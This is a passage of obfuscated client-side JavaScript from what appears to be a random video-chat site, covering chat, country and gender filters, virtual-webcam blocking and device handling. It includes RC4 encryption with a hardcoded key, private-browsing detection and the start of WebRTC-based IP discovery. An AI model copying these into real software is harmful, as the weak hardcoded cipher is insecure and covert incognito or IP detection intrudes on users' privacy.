}.call(this), function () {
  var e = _0x25991a;
  this.Chat = function () {
    var n, a, f, i, u, r, o, c, t, x, s, l, d, D, b, C, m, v, g, h, w, p, y, z, B, L, M, F, A, k = e;
    function E(e, u, r) {
      var o = k;
      a = $("#chat-history"), f = $("#chat-text"), n = $("#chat-greetings"), i = this, y = r, v = new MessageConcat, "TR" === e && (x = true), emojione.imageType = "png", emojione.imagePathPNG = "https://cdn.jsdelivr.net/emojione/assets/3.1/png/64/";
      var c = {};
      c.useInternalCDN = false, c.autocomplete = false, f.emojioneArea(c), (l = f[0].emojioneArea).on("keydown", function (e, n) {
        var a = o;
        if (13 === n.keyCode && (n.preventDefault(), !n.ctrlKey && !n.shiftKey)) return w.call(i);
      }), l.on("emojibtn.click", function () {
        return l.hidePicker();
      }), $("body").on("click", ".message-report-flag", function (e) {
        var n, a = o;
        return n = $(this).data("text"), new ReportPopup(u.getRemoteScreen(), u.report.bind(u), n).show(e);
      }), $("body").on("click", ".message-report-link", function (e) {
        var n = o;
        return e.preventDefault(), new ReportPopup(u.getRemoteScreen(), u.report.bind(u)).show(e);
      }), $(document).on("gender:change", this.setLocalAvatar.bind(this)), this.onStop();
    }
    return "\n", a = null, f = null, n = null, D = false, i = null, l = null, z = '<img class="logo" src="/images/roulette/avatar.svg" />', h = '<i class="flag"></i>', C = '<i class="flag flags-UA"></i>', L = false, M = false, B = null, F = null, x = false, s = false, g = false, o = false, r = function () {
      return o = true;
    }, $(window).on("roulette:silence", r), $(window).on("changelang", function (e, n) {
      return B = n;
    }), $(window).on("translate_messages", function (e, n) {
      return L = n;
    }), $(window).on("socket:dialog_data", function (e, n) {
      return p(n.Data);
    }), v = null, y = null, c = function () {
      var e = k;
      return a.children().not(".settings-button").remove();
    }, E.prototype.onSearch = function () {
      var e = k;
      return n.hide(), c(), a.show(), t(), u('<span class="tr" data-tr="searching" data-tr-id="1248">' + _.translate("searching") + "</span>");
    }, E.prototype.onBeginDialog = function (e) {
      var n, a, f, i, r = k;
      return g = e.BlFrame, "TR" === (a = e.Country) && (s = true), p(e.DialogData), c(), h = '<i class="flag flags-' + a + '"></i>', n = '<i class="flag message-flag flags-' + a + '"></i>', f = _.country(a), i = '<span class="tr" data-tr-id="1249" data-tr="connection">' + _.translate("connection") + "</span><br />\n" + n + '\n<span class="tr" data-tr="' + a + '">' + f + '</span>.\n<a href="#" class="message-report-link tr" data-tr-id="1239" data-tr="report">' + _.translate("report") + "</a>.", u(i), v.reset(), d();
    }, E.prototype.onStop = function () {
      var e = k;
      return c(), config.vertical_layout ? (n.hide(), a.show(), config.show_rules_text && u('<span class="tr" data-tr="rules" data-tr-id="1244">' + _.translate("rules") + "</span>")) : (a.hide(), n.show(), updateGreetingsButtons()), t();
    }, p = function (e) {
      var n, a = k;
      return n = DialogData.parse(e), M = n.data.translate, F = n.data.language;
    }, d = function () {
      return D = true;
    }, t = function () {
      return D = false;
    }, u = function (e, n) {
      var f, i, u, r = k;
      return null == n && (n = true), f = n && config.show_logo ? '<div class="message-avatar">' + z + "</div>" : "", i = n && config.show_logo ? "" : "no-logo", u = '<div class="message system">\n  ' + f + '\n  <div class="message-bubble ' + i + '">' + e + "</div>\n</div>", a.append(u);
    }, b = function () {
      return !(x || s) && (L || M) && F;
    }, m = function (e) {
      var n = k;
      return b() ? new Translator(e, B, F).translate().catch(function () {
        return null;
      }) : Promise.resolve(null);
    }, A = function (e, n) {
      var i = k;
      return (f = $(".message-small-text", e)).html(n), f.addClass("visible"), a.scrollTop(a.prop("scrollHeight"));
    }, w = function () {
      var e, n, a = k;
      if ((n = $("<div/>").text(l.getText().trim().replace(/\n/g, " ")).html()).length && D) return l.setText(""), e = this.appendOutcomeMessage(n), m(n).then(function (f) {
        var i, u = a;
        if (i = f ? n + "\n" + f : n, A(e, f), !o) return y.sendCHT(i);
      });
    }, E.prototype.appendIncomeMessage = function (e) {
      var n, a, f, i, u = k;
      if (!g) {
        a = (f = e.split("\n"))[0], i = f[1];
        var r = {};
        return r.avatar = h, r.class = "in", r.text = i || a, r.small_text = i ? a : "", n = r, this.appendMessage(n), v.reset();
      }
    }, E.prototype.appendOutcomeMessage = function (e) {
      var n, a = k, f = {};
      return f.avatar = C, f.class = "out", f.text = e, f.small_text = "", n = f, v.add(e), this.appendMessage(n);
    }, E.prototype.appendMessage = function (e) {
      var n, f, i, u = k;
      return f = $(".message", a).last().hasClass(e.class) ? e.class : e.class + " new", i = '<div class="message ' + f + '">\n  <div class="message-avatar">' + e.avatar + '</div>\n  <div class="message-bubble">\n    <div class="message-text">' + emojione.toImage(e.text) + '</div>\n    <div class="message-small-text ' + (e.small_text && "visible") + '">' + emojione.toImage(e.small_text) + '</div>\n    <i class="message-report-flag" data-text="' + e.text + '"></i>\n  </div>\n</div>', n = $(i), a.append(n), a.scrollTop(a.prop("scrollHeight")), n;
    }, E.prototype.setLocalAvatar = function (e, n) {
      return C = n.emoji;
    }, E;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.CountryFilter = function () {
    var n, a, f, i, u, r, o, c, t, x, s, l, d, D, b, C, m, v, g = e;
    i = null, l = ["AU", "AR", "BE", "BG", "BR", "GB", "HU", "VE", "GR", "DK", "IL", "IN", "ID", "IE", "ES", "IT", "CA", "CN", "CO", "LV", "LT", "MK", "MY", "MX", "NL", "NZ", "NO", "PE", "PL", "PT", "RO", "RS", "SK", "SI", "US", "TW", "TH", "TR", "PH", "FI", "FR", "HR", "CZ", "CL", "SE", "KR", "JP", "AT", "DE", "CH", "BY", "KZ", "MD", "RU", "UA", "ZA", "LU", "AM", "AL", "BA"], u = ["DZ", "BH", "EG", "JO", "IQ", "YE", "QA", "KW", "LB", "LY", "MR", "MA", "AE", "OM", "PS", "SA", "SY", "SO", "SD", "TN"], x = [], t = ["TR", "AZ"];
    var h = {};
    function w(e) {
      var i = _0x28ad;
      v = e, f = $("#country-filter-button"), n = f.closest(".buttons__button"), a = $("#country-filter-popup"), $(window).on("roulette:destroy", this.destroy);
    }
    return h.TR = .9, h.AZ = .9, h.PK = .9, h.IN = .9, h.ID = .85, h.AM = .75, h.GE = .75, h.IR = .9, h.DZ = .9, c = h, 0, "ZZ", C = "ZZ", s = "ZZ", f = null, n = null, a = null, v = null, D = function () {
      var e = _0x28ad;
      return f.removeClass("active"), a.removeClass("visible");
    }, w.prototype.initialize = function (e, n, o) {
      var t, d = g;
      if (null == o && (o = false), i = this, e && (s = e), o ? 0 : c[s] || 0, config.enable_geo) return x = "ar" === n ? u : l, e && -1 === x.indexOf(e) && "ar" !== n && (x.pop(), x.push(e)), t = function () {
        var e = d;
        try {
          return localStorage.selected_country;
        } catch (e) {}
      }() || e || "ZZ", !x.includes(t) && (t = "ZZ"), $("#country-filter-list").html(r(e)), t && b(t), "ZZ" === t && $(".country-filter-popup__country.all").addClass("selected"), m(t), f.mousedown(function (e) {
        var n, i = d;
        return (n = a.width() - $(".chat-container").width()) < 0 && (n = 0), n += f.parent().position().left + f.width() / 2, a[0].style.left !== "auto" && (n -= f.width()), a.css("transform-origin", n + "px 0 0"), genderSelector.hide(), e.stopPropagation(), f.toggleClass("active"), a.toggleClass("visible");
      }), a.on("mousedown", ".country-filter-popup__country", function (e) {
        var n = d;
        return m($(this).data("country")), $(".country-filter-popup__country").removeClass("selected"), $(this).addClass("selected"), D();
      }), a.mousedown(function (e) {
        return e.stopPropagation();
      }), $("body").mousedown(function (e) {
        return D();
      }), $(window).on("blur", function () {
        return D();
      }), this.justifyPopup();
    }, r = function (e) {
      var n = g;
      return d().map(function (a) {
        var f, i = n;
        return f = a.code === e ? "selected" : "", '<div class="country-filter-popup__country ' + f + '" data-country="' + a.code + '">\n  <i class="flag flags-' + a.code + '"></i>\n  <span class="tr" data-tr="' + a.code + '">' + a.name + "</span>\n</div>";
      }).join("");
    }, d = function () {
      var e = g;
      return x.map(function (n) {
        var a = e, f = {};
        return f.code = n, f.name = _.country(n), f;
      }).filter(function (n) {
        return n.name;
      }).sort(function (n, a) {
        var f = e;
        return n.name.localeCompare(a.name);
      });
    }, m = function (e) {
      var n = g;
      return b(e), i.setFilter();
    }, b = function (e) {
      var n, a, f = g;
      C = e, a = $("#country-selected"), n = $("#countries-all"), "ZZ" === e ? (a.hide(), n.show()) : (a.show(), n.hide());
      try {
        localStorage.setItem("selected_country", e);
      } catch (e) {}
      return a.removeClass(function (e, n) {
        var a = f;
        return n.split(/\s+/).filter(function (e) {
          return /^flags-/.test(e);
        }).join(" ");
      }), a.addClass("flags-" + e);
    }, w.prototype.setFilter = function () {
      var e, n = g;
      return e = t.includes(s) ? s : C, v.sendFIL(e);
    }, w.prototype.justifyPopup = function (e) {
      var f, i, u, r, o = g;
      if (null == e && (e = 0), u = n.position()) return f = (r = u.left + n.width() - 2) - e > (i = a.width()) ? r - i : "auto", a.css("left", f);
    }, w.prototype.destroy = function () {
      var e = g;
      return f.off("mousedown");
    }, w.prototype.hide = function () {
      return D();
    }, o = function () {
      var e, n = g;
      return e = $(".buttons__button").toArray().map(function (e) {
        var a = n;
        return $(".btn__bg", e).position().top;
      }), Math.max.apply(null, e) > 0;
    }, w.adjustPopup = function (e, n, f, i, u) {
      var r, c, t, x, s, l, d, D, b, C, m = g;
      x = function (e) {
        return (.7 * i * 1.6 + 2) * e + .6 * i + .7 * i * 2.3 + 2;
      }, t = (r = $(".country-filter")).position(), c = r.offset(), C = t.top, o() && (C += .07 * r.height()), l = C + n - t.top, D = 2 * e, b = 34 * i + 2, s = t.left + r.width() / 2 - Math.min(D, b) / 2, d = 0 - (c.left - t.left - u);
      var v = {};
      v.maxWidth = D, a.css(v);
      var _ = {};
      _.top = C || "", a.css(_);
      var h = {};
      return h.left = Math.max(s, d), a.css(h), x(15) > l ? a.addClass("wide") : a.removeClass("wide"), x(12) > l ? a.addClass("short") : a.removeClass("short");
    }, w;
  }();
}["call"](this), function () {
  var e = _0x25991a;
  this.Crypter = function () {
    var n, a = e;
    function f() {}
    return n = "coriolanus", f.encrypt = function (e) {
      var f = a;
      return CryptoJS.RC4.encrypt(e, n).toString();
    }, f.decrypt = function (e) {
      var f = a;
      return CryptoJS.RC4.decrypt(e, n).toString(CryptoJS.enc.Utf8);
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.DialogData = function () {
    var n, a = e;
    function f(e, f) {
      null == e && (e = {}), this.data = e, n || (n = f);
    }
    return n = null, f.parse = function (e) {
      return new f(function () {
        var n = _0x28ad;
        try {
          return JSON.parse(e || "{}");
        } catch (e) {
          return e, {};
        }
      }());
    }, f.prototype.update = function (e) {
      var n = a;
      return $.extend(this.data, e), this.save();
    }, f.prototype.save = function () {
      var e = a;
      if (null != n) return n.sendUDD(JSON.stringify(this.data));
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.DomainName = function () {
    var n, a = e;
    function f() {}
    return n = ["zumegle.com", "ome-tv.com", "www.omeglatv.com", "www.chatcall.tk", "anti-banner.com", "unbanchatalternative.com", "chatcall.tk", "www.chatogo.com", "skype2me.ru", "www.zumegle.com", "omeglaa.com", "acabteam.net", "bazoocam.pro", "bazoo-cam.com", "ariyoruz.ru", "unbanchatroulette.net", "m.ariyoruz.ru", "www.canliask.net", "www.chatki.club", "www.ometv.club", "www.chatroulet.club", "tinychat.site", "proxy", "vpn"], f.validate = function () {
      var e, f, i, u, r, o, c = a;
      for (i = self.parent && self.parent !== self && 0 !== self.parent.frames.length ? ((e = document.createElement("a")).href = document.referrer, e.hostname) : location.hostname, o = [], u = 0, r = n.length; u < r; u++) f = n[u], -1 !== i.indexOf(f) ? o.push(top.location = "https://ome.tv") : o.push(void 0);
      return o;
    }, f;
  }();
}["call"](this), function () {
  var e = _0x25991a;
  this.FCN = function () {
    var n, a, f, i, u = e;
    function r() {}
    return a = ["^(?=.*Intel)(?=.*Depth).*$", "AlterCam", "ArcSoft", "Avkys", "Avkeys", "AvStream Media Device", "CamMask", "CamSuite", "CamTwist", "Camdirector2", "Camoid", "Cameroid", "ChromaCam", "CyberLink", "DroidCam", "Dummy Video Device", "Dxtory Video", "EpocCam", "FaceRig", "Fake", "KVYcam", "Kinoni Video Source", "MJPEG Camera", "Magic-i", "MagicCamera", "ManyCam", "MayhemGameCapture1", "OBS-camera", "OBS Virtual Camera", "RZ Screen", "screen-capture-recorder", "ScreenCamera", "Snap Camera", "SparkoCam", "SplitCam", "Splitter", "SuperWebcam Capture", "ThinkVantage", "TrackerCam Capture", "TriDef", "USB2.0 Grabber", "UScreenCapture", "VHMultiCam", "VerySoft WebCamSplitter", "VidBlaster VVD", "Video2Webcam", "Virtual Webcam", "WebCamEffects Video Capture", "Webcam Simulator Source", "WebcamMax", "WebcamStudio Video Device", "Wirecast", "XSplitBroadcaster", "ZD Soft", "e2eSoft", "iGlasses", "vMix", "vcam", "vircam", "demoid", "ZX4Webcam"], f = ["^.$", "^[0-9]+$", "^(.)\\1+$", "^(?=.*Virtual)(?!.*Intel).*$", "Alex's V Project", "AV WebCam Capture", "AVerMedia, AVerTV WDM Video Capture", "Behold TV 409 FM", "Behold TV Columbus", "Beholder A/V Capture", "Beholder Video Capture", "Broadcast SC Video Filter", "Bytescout Screen Capturing Filter", "CamDirector", "Camtasia Studio Video Capture Driver", "Conexant Capture", "drahtwerk's iWebcamera", "False", "FOX_BOX", "Google Camera", "Hauppauge WinTv video capture", "hook cam", "HP Web Camera Filter", "IP Camera", "JiaoMPC Capture", "Klaok", "Luminositi Softcam", "MC Web Cam", "menycam", "Movie", "My Webcam", "PCTV 380e/510e Device", "Pinnacle PCTV 713x Tuner BDA Analog Capture", "Reallusion", "REConverterCapDevice", "subocam", "TV Card WDM Video Capture", "VHScrCap", "video2", "Video2Webc", "videochatde", "VideoMate TV Capture", "vidloop", "VISIT-X Video Splitter", "WCStudio video device", "Webcam 170", "Webcam2", "Zetacam"], n = ["^[a-z0-9]+$"], i = function (e, n, a) {
      var f, i, r, o = u;
      for (null == a && (a = "i"), f = 0, i = n.length; f < i; f++) if (r = n[f], new RegExp(r, a).test(e)) return true;
      return false;
    }, r.isValid = function (e) {
      return !i(e, a);
    }, r.isSuspicious = function (e) {
      return i(e, f) || i(e, n, "") || false;
    }, r;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.GenderSelector = function () {
    var n, a, f, i, u, r, o, c, t = e;
    n = null, a = null;
    var x = {};
    x.slug = "male", x.tr_id = 1315, x.value = 1, x.emoji = ":man:";
    var s = {};
    s.slug = "female", s.tr_id = 1316, s.value = 2, s.emoji = ":woman:";
    var l = {};
    function d() {
      var e, f, r = t;
      this.initialize = (e = this.initialize, f = this, function () {
        var n = _0x28ad;
        return e.apply(f, arguments);
      }), n = $(".gender-selector-button"), a = $(".gender-selector__popup"), u = u.map(function (e) {
        var n = r;
        return e.emoji = emojione.toImage(e.emoji).replace(/png/g, "svg"), e.label = _.translate(e.slug), e;
      }), i = function () {
        var e = r;
        try {
          return null != localStorage.gender;
        } catch (e) {}
      }(), c(function () {
        var e = r;
        try {
          return parseInt(localStorage.gender);
        } catch (e) {}
      }());
    }
    return l.slug = "couple", l.tr_id = 1317, l.value = 1, l.emoji = ":couple:", u = [x, s, l], o = null, i = false, f = false, c = function (e) {
      var a = t;
      !u[e] && (e = 0), o = u[e];
      try {
        localStorage.setItem("gender", e);
      } catch (e) {}
      return $(".selected-value", n).html(o.emoji), $(".gender-selector__popup-item").removeClass("selected"), $(".gender-selector__popup-item").eq(e).addClass("selected"), $(document).trigger("gender:change", o);
    }, r = function () {
      var e = t;
      return a.removeClass("visible"), n.removeClass("active");
    }, d.prototype.initialize = function (e) {
      var f, i = t;
      return f = u.map(function (e, n) {
        var a, f = i;
        return a = e.slug === o.slug ? "selected" : "", '<div class="gender-selector__popup-item ' + a + '" data-value="' + n + '">\n  ' + e.emoji + '\n  <span class="tr" data-tr-id="' + e.tr_id + '" data-tr="' + e.slug + '">' + e.label + "</span>\n</div>";
      }), a.html(f.join("")), n.mousedown(function (e) {
        var n = i;
        return null != window.countryFilter && countryFilter.hide(), e.stopPropagation(), $(this).toggleClass("active"), $(this).parent().next(".gender-selector__popup").toggleClass("visible");
      }), $(".gender-selector__popup-item", a).click(function (n) {
        var a = i;
        return c($(this).data("value")), e.update(), r();
      }), a.mousedown(function (e) {
        return e.stopPropagation();
      }), $("body").mousedown(function (e) {
        return r();
      }), $(window).on("blur", function () {
        return r();
      }), $(document).on("roulette:init", function () {
        var e = i;
        return $(document).trigger("gender:change", o);
      });
    }, d.prototype.gender = function () {
      return f ? u[0] : o;
    }, d.prototype.hide = function () {
      return r();
    }, d.prototype.preselect = function (e) {
      var n = t;
      if ((e.isPayer || e.attachedData.isSuspected) && (f = true), e.attachedData.isFemale && !i) return c(1);
    }, d;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.IncognitoMode = function () {
    var n, a = e;
    function f() {}
    return n = false, f.detect = function () {
      return new Promise(function (e) {
        var a, f, i = _0x28ad;
        if (f = function () {
          return n = true, e(true);
        }, a = function () {
          return e(false);
        }, window.webkitRequestFileSystem) return window.webkitRequestFileSystem(0, 0, a, f);
        if (/connstructor/i.test(window.HTMLElement)) try {
          localStorage.length || (localStorage.x = 1, localStorage.removeItem("x")), a();
        } catch (e) {
          e, navigator.cookieEnabled ? f() : a();
        }
        return window.indexedDB || !window.PointerEvent && !window.MSPointerEvent ? navigator.doNotTrack ? f() : a() : f();
      });
    }, f.detected = function () {
      return n;
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.LanguageSelector = function () {
    var n, a, f, i, u, r, o = e;
    function c() {
      var e, r = o;
      u = this, f = $("#language-selector-button"), a = $("#language-selector-popup"), n = $("#language-selector-label"), this.isOpened = false, this.language = this.defaultLanguage(), $(window).trigger("changelang", this.language), e = $("div", a), i.sort(function (e, n) {
        var a = r;
        return e[1].localeCompare(n[1]);
      }).forEach(function (a) {
        var f, i, o, c = r;
        return f = a[0], o = a[1], f === u.language ? (n.text(o), i = "selected") : i = "", e.append('<div class="language-selector__popup-item ' + i + "\" data-value='" + f + "'>" + o + "</div>");
      }), f.mousedown(function (e) {
        var n = r;
        return e.stopPropagation(), f.toggleClass("active"), a.toggleClass("visible"), u.isOpened = !u.isOpened;
      }), f.click(function (e) {
        return e.stopPropagation();
      }), a.on("click", ".language-selector__popup-item", function () {
        var e, a = r;
        if (e = $(this), u.language !== e.data("value")) {
          $(".language-selector__popup-item").removeClass("selected"), u.language = e.data("value"), n.text(e.text());
          try {
            localStorage.setItem("language", u.language);
          } catch (e) {}
          return $(window).trigger("changelang", u.language), e.addClass("selected");
        }
      });
    }
    return u = null, i = [["zh", "中文"], ["de", "Deutsch"], ["en", "English"], ["es", "Español"], ["fr", "Français"], ["it", "Italiano"], ["ja", "日本語"], ["nl", "Nederlands"], ["pl", "Polski"], ["pt", "Português"], ["uk", "Українська"], ["tr", "Türkçe"], ["ar", "العربية"], ["hi", "हिन्दी"], ["ms", "Bahasa Melayu"], ["fi", "Suomi"], ["sk", "Slovenský"], ["id", "Indonesia"], ["th", "ไทย"], ["da", "Dansk"], ["nb", "Norsk"], ["hu", "Magyar"], ["cs", "Čeština"], ["vi", "Tiếng Việt"], ["he", "עברית"], ["ro", "Română"], ["ko", "한국어"], ["sv", "Svenska"], ["sq", "Shqip"], ["bs", "Bosanski"], ["bg", "Български"], ["ca", "Català"], ["hr", "Hrvatski"], ["et", "Eesti"], ["el", "Ελληνικά"], ["lv", "Latviešu"], ["lt", "Lietuvių"], ["mt", "Malti"], ["sr", "Srpski"], ["sl", "Slovenščina"], ["fil", "Tagalog"], ["fa", "فارسی"], ["ru", "Русский"], ["ur", "انگریزی"]], "en", f = null, a = null, n = null, r = function () {
      var e = o;
      return f.removeClass("active"), a.removeClass("visible");
    }, c.prototype.hide = function () {
      return this.isOpened = false, r();
    }, c.prototype.defaultLanguage = function () {
      var e, n = o;
      return e = function () {
        var e = _0x28ad;
        try {
          return Helper.queryParam("lang") || localStorage.getItem("language") || navigator.language.substr(0, 2);
        } catch (e) {}
      }(), -1 === i.map(function (e) {
        return e[0];
      }).indexOf(e) ? "en" : e;
    }, c;
  }();
}["call"](this), function () {
  this.Locker = function (e, n) {
    var a = _0x28ad;
    null == n && (n = true), $("#disconnection-popup-message").html(e), Overlay.show($("#disconnection-popup")), !n && ($(".disconnection-popup__button").hide(), $(".popup-footer").hide()), $(".reload-button").click(function () {
      return Helper.reload();
    });
  };
}.call(this), function () {
  var e = _0x25991a;
  this.MediaDevice = function () {
    var n, a = e;
    function f(e) {
      var n = a;
      this.device = e, this.label = e.label, this.cleanLabel = this.label.replace(/\s?\([a-z0-9]{4}\:[a-z0-9]{4}\)/g, ""), this.isValid = FCN.isValid(this.label), this.isSuspicious = this.isValid && FCN.isSuspicious(this.label), this.isVideoInput = e.kind === "videoinput", this.isAudioInput = e.kind === "audioinput";
    }
    return n = ["FaceTime HD Camera", "Intel\\(R\\) RealSense\\(TM\\) 3D Camera Virtual Driver"], f.prototype.fromMobileDevice = function () {
      var e = a;
      return new RegExp("front|back|rear", "ig").test(this.label);
    }, f.prototype.inWhitelist = function () {
      var e = a;
      return new RegExp(n.join("|"), "ig").test(this.label);
    }, f.prototype.hasVendorId = function () {
      var e = a;
      return this.label !== this.cleanLabel || this.fromMobileDevice() || this.inWhitelist();
    }, f.prototype.toJSON = function (e) {
      var n = a, f = {};
      return f.label = this.label, f.groupId = this.device.groupId, f.isActive = e.activeLabel.length > 0 && e.activeLabel === this.label, f.isValid = this.isValid, f.isSuspicious = this.isSuspicious, f;
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.MediaDevices = function () {
    var n, a, f, i, u, r, o, c, t, x, s, l, d, D, b, C, m, v, g, h, w, p, y, z, B, L, M, F, A, k, E, j, S, T, P, H, N = e;
    B = {}, l = [], P = [], u = [], T = [], S = [], i = "", f = "";
    var q = {};
    q.min = 640, q.max = 640;
    var K = {};
    K.min = 480, K.max = 480;
    var U = {};
    U.aspectRatio = 1.333333333, U.width = q, U.height = K;
    var Z = {};
    function G(e) {
      var a = N;
      B = e, n = $("#media-devices"), L(), c = B.CameraAccessHint;
    }
    return Z.audio = {}, Z.video = U, p = Z, n = null, H = null, r = null, E = false, C = false, a = 0, c = null, G.isWebRTCSupported = function () {
      var e = N;
      return Promise.resolve(!!(navigator.mediaDevices && window.RTCPeerConnection && window.RTCSessionDescription));
    }, L = function () {
      var e, n = N;
      return e = function (e) {
        var n = _0x28ad;
        return e.name === "NotAllowedError" ? (a = 2, E && w(), setTimeout(L, 2500), z()) : g();
      }, navigator.mediaDevices.getUserMedia(p).then(g, e);
    }, g = function () {
      var e = N;
      return a = 1, c.hide(), d().then(b).then(o).then(M).catch(z).then(h);
    }, d = function () {
      var e, n = N;
      return null == (null != (e = navigator.mediaDevices) ? e.enumerateDevices : void 0) ? Promise.resolve([]) : navigator.mediaDevices.enumerateDevices();
    }, b = function (e) {
      var n, a = N;
      if (l = e.map(function (e) {
        return y(e.label), new MediaDevice(e);
      }), P = l.filter(function (e) {
        return e.isVideoInput;
      }), u = l.filter(function (e) {
        return e.isAudioInput;
      }), null != blogger.allowFakeWebcam ? (T = P, S = u) : (T = P.filter(function (e) {
        return e.isValid;
      }), S = u.filter(function (e) {
        return e.isValid;
      }), (n = T.filter(function (e) {
        return e.hasVendorId();
      })).length && (T = n)), s(), B.extraUserData.update(), 0 === T.length || 0 === S.length) throw "No valid devices found";
      return B.onGetDeviceList();
    }, s = function () {
      var e, n, a, f, i, u = N;
      for (f = new Set, n = 0, i = P.length; n < i; n++) {
        if ((a = (e = P[n]).cleanLabel).length > 0 && !e.fromMobileDevice() && f.has(a)) return void (C = true);
        f.add(a);
      }
    }, o = function () {
      var e = N, n = {};
      n.activeLabel = i, n.onOpen = function () {
        return r.close();
      }, n.onSelect = function (n) {
        var a = e, f = {};
        return f.video = n.device.deviceId, k(f);
      }, H = new MediaSelect(T, $("#video-devices"), n);
      var a = {};
      return a.activeLabel = f, a.onOpen = function () {
        return H.close();
      }, a.onSelect = function (n) {
        var a = e, f = {};
        return f.audio = n.device.deviceId, k(f);
      }, r = new MediaSelect(S, $("#audio-devices"), a), A();
    }, A = function () {
      var e = N;
      return n.click(x), n.mouseleave(x);
    }, x = function () {
      var e = N;
      if (H && H.close(), r) return r.close();
    }, M = function () {
      var e, n, a = N, f = {};
      return f.video = null != (e = T[0]) ? e.device.deviceId : void 0, f.audio = null != (n = S[0]) ? n.device.deviceId : void 0, k(f);
    }, k = function (e) {
      var n = N;
      if (null != e.video) {
        var a = {};
        a.exact = e.video, p.video.deviceId = a;
      }
      if (null != e.audio) {
        var f = {};
        f.exact = e.audio, p.audio.deviceId = f;
      }
      return D();
    }, D = function () {
      var e = N;
      return navigator.mediaDevices.getUserMedia(p).then(function (n) {
        var a, u, r = e;
        if (u = n.getTracks(), a = function (e) {
          var n = r;
          return (u.filter(function (a) {
            return a.kind === e;
          })[0] || {}).label;
        }, null == blogger.allowFakeWebcam && u.filter(function (e) {
          var n = r;
          return y(e.label), FCN.isValid(e.label);
        }).length !== u.length) throw "Invalid stream obtained";
        return i = a("video"), f = a("audio"), t(), v(), m(), B.onGetStream(n), B.extraUserData.update();
      }).catch(z);
    }, t = function () {
      var e = N;
      if (!B.isCoolUser && T.length !== P.length && !i) throw new Locker(_.translate("legacy_browser"), false), window.destroy(), "Legacy browser";
    }, h = function () {
      var e = N;
      if (C && !B.isCoolUser && !B.isLoggedIn()) return window.rComponents.loginPopup.show(true);
    }, y = function (e) {
      var n = N;
      if (null == blogger.allowFakeWebcam && -1 !== String(e).toLowerCase().indexOf("manycam")) throw new Locker(_.translate("manycam_message")), window.destroy(), "Manycam";
    }, z = function (e) {
      var n = N;
      return j(), B.onGetStreamFail();
    }, j = function () {
      var e = N;
      return v(), $("#local-video-alert").show();
    }, m = function () {
      var e = N;
      return $("#local-video-alert").hide();
    }, function () {
      var e = N;
      return m(), n.addClass("busy");
    }, v = function () {
      var e = N;
      return n.removeClass("busy");
    }, w = function () {
      var e = N;
      if (Helper.isChrome()) switch (E = true, a) {
        case 0:
          return c.showLeft();
        case 1:
          return c.hide();
        case 2:
          return c.showRight();
      }
    }, F = function (e) {
      var n = N;
      return this.map(function (a) {
        var f = n, i = {};
        return i.activeLabel = e, a.toJSON(i);
      });
    }, G.videoDevices = function () {
      return F.call(P, i);
    }, G.audioDevices = function () {
      return F.call(u, f);
    }, G.hasIdenticalVideoDevices = function () {
      return C;
    }, G.prototype.maybeShowStreamDummy = w, G.prototype.devices = function () {
      return F.call(l, "");
    }, G;
  }();
}["call"](this), function () {
  var e = _0x25991a, n = function (e, n) {
    return function () {
      var a = _0x28ad;
      return e.apply(n, arguments);
    };
  };
  this.MediaSelect = function () {
    var a = e;
    function f(e, a, f) {
      var i, u, r, o = _0x28ad;
      (this.close = n(this.close, this), this.open = n(this.open, this), this.devices = e, this.container = a, this.list = $(".media-select__list", this.container), this.options = f, this.container.addClass("opened").removeClass("opened"), this.devices.filter(function (e) {
        return e.label;
      }).length < 2) ? this.container.hide() : (this.container.show(), u = (i = this.devices.filter((r = this, function (e) {
        var n = _0x28ad;
        return e.label === r.options.activeLabel;
      }))).length ? i[0].cleanLabel : this.devices[0].cleanLabel, this.buildDeviceList(), this.setDeviceLabel(u), this.setHandlers());
    }
    return f.prototype.open = function () {
      var e = a;
      return this.list.show(), this.container.addClass("opened");
    }, f.prototype.close = function () {
      var e = a;
      return this.list.hide(), this.container.removeClass("opened");
    }, f.prototype.buildDeviceList = function () {
      var e, n = a;
      return this.devices.forEach((e = this, function (n) {
        var a, f = _0x28ad;
        return (a = $('<div class="media-select__list-item"><div>' + n.cleanLabel + "</div></div>")).data(n), e.list.append(a);
      }));
    }, f.prototype.setDeviceLabel = function (e) {
      var n = a;
      return $(".media-select__label-text", this.container).html(e);
    }, f.prototype.setHandlers = function () {
      var e, n, f = a;
      return e = this, $(".media-select__select", this.container).click((n = this, function (e) {
        var a = _0x28ad;
        return e.stopPropagation(), n.list.toggle(), $(n.container).toggleClass("opened"), n.options.onOpen();
      })), $(".media-select__list-item", this.container).click(function (n) {
        var a, i = f;
        if (a = $(this).data(), e.options.onSelect(a)) return e.setDeviceLabel(a.cleanLabel);
      });
    }, f;
  }();
}.call(this), function () {
  var e = _0x25991a;
  this.MessageConcat = function () {
    var n, a, f, i = e;
    function u() {}
    return 3, n = null, a = false, f = function (e) {
      var n, a = _0x28ad;
      return (n = e.split(" ").filter(function (e) {
        var n = a;
        return e.trim().length;
      }).length) > 0 && n <= 3;
    }, u.prototype.add = function (e) {
      var u = i;
      return f(e) ? n ? (a = this.handleMessage(n + " " + e, a)) ? this.reset() : n = e : (a = this.handleMessage(e), n = e) : (this.handleMessage(e), void this.reset());
    }, u.prototype.handleMessage = function (e, n) {
      return quotes.handleMessage(e, n);
    }, u.prototype.reset = function () {
      return n = null, a = false;
    }, u;
  }();
}.call(this), function () {
  var e, n = _0x25991a;
  this.MinichatUserData = (e = n, window.addEventListener("message", function (n) {
    var a = e;
    if (n.data.user) {
      var f = {};
      return f.user = n.data.user, dialogData.update(f);
    }
  }), function () {});
}.call(this), function () {
  var e = _0x25991a, n = function (e, n) {
    return function () {
      var a = _0x28ad;
      return e.apply(n, arguments);
    };
  };
  this.MyIP = function () {
    var a = e;
    function f() {
      var e = _0x28ad;
      this.global = n(this.global, this), this.local = n(this.local, this), this.detect = n(this.detect, this);
    }
    return f.prototype.detect = function () {
      var e, n, f = a, i = {};
      return i.host = {}, i.srflx = {}, this.ips = i, e = [], new Promise((n = this, function (a, f) {
        var i, u, r, o, c = _0x28ad, t = {};
        t.urls = "stun:stun1.l.google.com:19302";
        var x = {};
        x.googIPv6 = false;
        var s = {};
